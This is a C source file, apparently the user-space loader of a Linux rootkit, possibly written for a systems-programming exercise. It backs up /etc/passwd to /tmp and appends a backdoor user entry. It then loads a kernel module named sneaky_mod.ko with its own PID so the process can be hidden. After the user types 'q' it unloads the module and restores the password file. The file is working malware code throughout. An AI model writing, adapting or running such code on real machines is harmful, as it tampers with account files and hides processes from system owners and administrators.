#include<sys/types.h>
#include<sys/wait.h>
#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<unistd.h>

#define TARGET_FILE "/etc/passwd"
#define SNEAKY_FILE "/tmp/passwd"
#define NEW_LINE "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n"

/*copy file from src to dst*/
int copy_pwd(const char* src, const char* dst){
  FILE* src_file = fopen(src,"r");
  FILE* dst_file = fopen(dst,"w+");
  if(src_file == NULL || dst_file == NULL){
    perror("Failed to open src or dst file in copy_pwd.");
    return -1;
  }
  int c;
  while((c = fgetc(src_file)) != EOF){
    fprintf(dst_file, "%c", (char)c);
  }
  
  if(fclose(src_file) != 0 || fclose(dst_file) != 0){
    perror("Failed to close src or dst file in copy_pwd.");
    return -1;
  }
  return 0;
}

/*insert into /etc/passwd a new user*/
int replace_pwd(){
  if(copy_pwd(TARGET_FILE, SNEAKY_FILE) == -1){
    printf("Failed copy_pwd in replace_pwd.\n");
    return -1;
  }
  FILE* src_file = fopen(TARGET_FILE, "a");
  if(src_file == NULL){
    perror("Failed to open TARGET_FILE in replace_pwd.");
    return -1;
  }
  fprintf(src_file, "%s", NEW_LINE);
  if(fclose(src_file) != 0){
    perror("Failed to close TARGET_FILE in replace_pwd.");
    return -1;
  }
  return 0;
}

/*restore original /etc/passwd*/
int restore_pwd(){
  if(copy_pwd(SNEAKY_FILE, TARGET_FILE) == -1){
    printf("Failed copy_pwd in restore_pwd.\n");
    return -1;
  }
  return 0;
}

int sneak_mode(int pid_to_hide){
  pid_t load_sneaky_pid = fork();
  if(load_sneaky_pid < 0){
    printf("Failed to fork in loading sneak_mode!");
    return -1;
  }
  /*child process*/
  else if(load_sneaky_pid == 0){
    char send_pid[50];
    snprintf(send_pid, sizeof(send_pid), "PID=%d", pid_to_hide);
    char* argv[]={"insmod", "sneaky_mod.ko", send_pid, NULL};
    if(execvp(argv[0], argv) < 0){
      perror("insmod in sneak_mode failed!");
      exit(EXIT_FAILURE);
    }
  }
  /*parent process*/
  else{
    waitpid(load_sneaky_pid, NULL, 0);
    char input_c;
    printf("SneakyInput$");
    while((input_c = fgetc(stdin)) != 'q'){
      // do nothing but wait for 'q'
    }
    printf("Load finished in sneak_mode.\n");
    pid_t unload_sneaky_pid = fork();
    if(unload_sneaky_pid < 0){
      printf("Failed to fork in unloading sneak_mode!\n");
      return -1;
    }
    /*another child process to unload sneaky_mode*/
    else if(unload_sneaky_pid == 0){
      char* argv[]={"rmmod", "sneaky_mod.ko", NULL};
      if(execvp(argv[0], argv) < 0){
        perror("rmmod in sneak_mode failed!");
        exit(EXIT_FAILURE);
      }
    }
    else{
      waitpid(unload_sneaky_pid, NULL, 0);
      printf("Unload finished in sneaky_mode.\n");
    }
  }
  return 0;
}

int main(int argc , const char* argv[]){
  int pid = getpid();
  printf("sneaky_process pid = %d\n", pid);
  if(replace_pwd() == -1){
    printf("Failed to copy the password file.\n");
    exit(EXIT_FAILURE);
  }

  if(sneak_mode(pid) == -1){
    exit(EXIT_FAILURE);
  }

  if(restore_pwd() == -1){
    printf("Failed to restore the password file.\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
